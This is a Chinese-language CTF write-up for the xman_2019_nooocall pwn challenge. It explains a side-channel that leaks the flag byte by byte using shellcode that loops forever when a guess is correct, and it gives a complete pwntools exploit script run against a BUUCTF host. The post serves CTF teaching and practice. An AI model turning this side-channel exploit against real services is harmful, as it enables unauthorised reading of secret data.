# xman_2019_nooocall



### 总结

可以输入`shellcode`，但是又不能使用任何系统调用。因此，可以使用侧信道攻击，通过一些现象、反馈等猜测出`flag`。侧信道常用的反馈有错误、死循环、异常分支等。这里采用死循环，步骤为：

- 编写`shellcode`猜测`flag`的每一位，如果比较正确则死循环

- 使用`tube.can_recv()`进行判断，如果陷入死循环，说明当前字符猜测成功

`buuctf`上的`flag`都是`uuid`字符串，因此猜测的字符的范围限于`0123456789abcdef-`。

<!-- more -->

### EXP

```python
from pwn import *

context.arch="amd64"
context.os='linux'
context.endian="little"
context.log_level="error"

shellcode = """
add al, 2
sal rax, 32
mov bl, byte ptr [rax+{}]
cmp bl, {}
jz $-0x3 
"""

possible_char="0123456789abcdef-}"
pi = [ord(x) for x in possible_char]

flag = 'flag{'
idx = 5
n = 32
ip = 'node4.buuoj.cn'
port = 28277
print("ip: {}, port: {}".format(ip, port))
while 1:
    bb = True
    for x in pi:
        # p = process("./xman_2019_nooocall")
        p = remote(ip, port)
        p.sendafter("Your Shellcode >>", asm(shellcode.format(idx, x)))
        bb = p.can_recv(timeout=3)
        p.close()
        if not bb:
            flag += chr(x)
            print(f"current flag: {flag}")
            break

    if flag.endswith("}"):
        break
    if bb:
        print("something wrong...")
        continue

    idx += 1

```

![image-20211030001254942](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211030001254942.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2021-10-29-xman-2019-nooocall/  

